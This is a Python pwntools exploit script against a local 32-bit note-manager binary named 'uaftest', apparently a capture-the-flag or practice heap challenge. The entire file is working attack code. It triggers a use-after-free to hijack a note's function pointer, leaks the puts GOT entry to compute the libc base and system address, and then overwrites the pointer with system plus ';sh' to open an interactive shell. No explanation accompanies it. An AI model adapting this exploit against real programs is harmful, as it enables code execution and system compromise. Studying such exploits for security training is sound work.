from pwn import *
context(os='linux',arch='i386')#,log_level='debug'
def main():
    elf  = ELF('uaftest')
    lib='/lib/i386-linux-gnu/libc.so.6'
    libc = ELF(lib)
    puts_got=elf.got['puts']
    print_put =  p32(0x804862B)+p32(puts_got)
    r = process('./uaftest')#,env=env)
    #gdb.attach(r,'b *0804869A \nc\n')
    r.sendlineafter('choice :','1')  #0
    r.sendlineafter('ote size :',"8")
    r.sendlineafter('Content :','b'*7)

    r.sendlineafter('choice :','1') #1
    r.sendlineafter('ote size :',"8")
    r.sendlineafter('Content :','c'*7)

    r.sendlineafter('choice :','2')
    r.sendlineafter('Index :',"1")

    r.sendlineafter('choice :','2')
    r.sendlineafter('Index :',"0")

    r.sendlineafter('choice :','1')
    r.sendlineafter('ote size :',"16")
    r.sendlineafter('Content :','d'*15)

    r.sendlineafter('choice :','1')
    r.sendlineafter('ote size :',"8")
    r.sendlineafter('Content :',print_put)

    r.sendlineafter('choice :','3')
    r.sendlineafter('Index :',"1")

    text = r.recv()
    puts_addr=unpack(text[0:4],32,endian='little')

    libc.address =   puts_addr - 0x5FCA0# 0x1AE244
    bin = libc.symbols['system']
    print 'puts addr',hex(puts_addr)
    print 'base addr',hex(libc.address)
    print 'system addr',hex(bin)
    r.sendline("2")
    r.sendlineafter('Index :',"3")

    r.sendlineafter('choice :','1')
    r.sendlineafter('ote size :',"8")
    r.sendlineafter('Content :',p32(bin)+';sh')

    r.sendlineafter('choice :','3')

    r.sendlineafter('Index :',"1")

    r.interactive()

if __name__ == '__main__':
    main()
"""
 1. Add note
 2. Delete note
 3. Print note
 4. Exit
"""